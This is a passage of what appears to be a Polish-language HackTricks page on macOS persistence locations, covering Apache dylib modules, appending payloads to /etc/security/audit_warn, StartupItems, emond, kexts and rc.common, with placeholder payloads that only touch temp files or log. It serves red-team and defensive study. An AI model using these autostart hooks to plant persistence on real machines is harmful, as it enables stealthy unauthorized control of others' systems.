LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
W ten sposób twoje skompilowane moduły będą ładowane przez Apache. Jedyną rzeczą jest to, że musisz **podpisać je ważnym certyfikatem Apple**, lub musisz **dodać nowy zaufany certyfikat** w systemie i **podpisać go** tym certyfikatem.

Następnie, jeśli to konieczne, aby upewnić się, że serwer zostanie uruchomiony, możesz wykonać:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Przykład kodu dla Dylb:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM audit framework

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- Przydatne do obejścia sandbox: [🟠](https://emojipedia.org/large-orange-circle)
- Ale musisz być root, auditd musi działać i spowodować ostrzeżenie
- Obejście TCC: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/etc/security/audit_warn`**
- Wymagany root
- **Trigger**: Gdy auditd wykryje ostrzeżenie

#### Description & Exploit

Kiedy auditd wykryje ostrzeżenie, skrypt **`/etc/security/audit_warn`** jest **wykonywany**. Możesz więc dodać swój ładunek do niego.
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
Możesz wymusić ostrzeżenie za pomocą `sudo audit -n`.

### Elementy uruchamiania

> [!CAUTION] > **To jest przestarzałe, więc nic nie powinno być znalezione w tych katalogach.**

**StartupItem** to katalog, który powinien być umieszczony w `/Library/StartupItems/` lub `/System/Library/StartupItems/`. Po utworzeniu tego katalogu, musi on zawierać dwa konkretne pliki:

1. **skrypt rc**: Skrypt powłoki wykonywany podczas uruchamiania.
2. **plik plist**, nazwany `StartupParameters.plist`, który zawiera różne ustawienia konfiguracyjne.

Upewnij się, że zarówno skrypt rc, jak i plik `StartupParameters.plist` są poprawnie umieszczone w katalogu **StartupItem**, aby proces uruchamiania mógł je rozpoznać i wykorzystać.

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> Nie mogę znaleźć tego komponentu w moim macOS, więc w celu uzyskania dalszych informacji sprawdź opis

Opis: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Wprowadzony przez Apple, **emond** to mechanizm logowania, który wydaje się być niedorozwinięty lub być może porzucony, jednak pozostaje dostępny. Chociaż nie jest szczególnie korzystny dla administratora Maca, ta niejasna usługa może służyć jako subtelna metoda utrzymywania się dla aktorów zagrożeń, prawdopodobnie niezauważona przez większość administratorów macOS.

Dla tych, którzy są świadomi jej istnienia, identyfikacja jakiegokolwiek złośliwego użycia **emond** jest prosta. LaunchDaemon systemu dla tej usługi poszukuje skryptów do wykonania w jednym katalogu. Aby to sprawdzić, można użyć następującego polecenia:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Location

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Wymagany root
- **Wyzwalacz**: Z XQuartz

#### Description & Exploit

XQuartz **nie jest już zainstalowany w macOS**, więc jeśli chcesz więcej informacji, sprawdź opis.

### ~~kext~~

> [!CAUTION]
> Instalacja kext, nawet jako root, jest tak skomplikowana, że nie będę tego rozważać jako sposobu na ucieczkę z piaskownic ani nawet na utrzymanie (chyba że masz exploit)

#### Location

Aby zainstalować KEXT jako element startowy, musi być **zainstalowany w jednej z następujących lokalizacji**:

- `/System/Library/Extensions`
- Pliki KEXT wbudowane w system operacyjny OS X.
- `/Library/Extensions`
- Pliki KEXT zainstalowane przez oprogramowanie firm trzecich

Możesz wylistować aktualnie załadowane pliki kext za pomocą:
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
Dla uzyskania dodatkowych informacji o [**rozszerzeniach jądra sprawdź tę sekcję**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers).

### ~~amstoold~~

Opis: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Lokalizacja

- **`/usr/local/bin/amstoold`**
- Wymagane uprawnienia roota

#### Opis i wykorzystanie

Najwyraźniej `plist` z `/System/Library/LaunchAgents/com.apple.amstoold.plist` używał tego binarnego pliku, jednocześnie eksponując usługę XPC... problem w tym, że ten plik binarny nie istniał, więc mogłeś umieścić coś tam, a gdy usługa XPC zostanie wywołana, twój plik binarny zostanie wywołany.

Nie mogę już tego znaleźć w moim macOS.

### ~~xsanctl~~

Opis: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Lokalizacja

- **`/Library/Preferences/Xsan/.xsanrc`**
- Wymagane uprawnienia roota
- **Wyzwalacz**: Gdy usługa jest uruchamiana (rzadko)

#### Opis i wykorzystanie

Najwyraźniej nie jest zbyt powszechne uruchamianie tego skryptu i nie mogłem go nawet znaleźć w moim macOS, więc jeśli chcesz więcej informacji, sprawdź opis.

### ~~/etc/rc.common~~

> [!CAUTION] > **To nie działa w nowoczesnych wersjach MacOS**

Możliwe jest również umieszczenie tutaj **komend, które będą wykonywane przy starcie.** Przykład standardowego skryptu rc.common:
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Techniki i narzędzia utrzymywania

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

{{#include ../banners/hacktricks-training.md}}
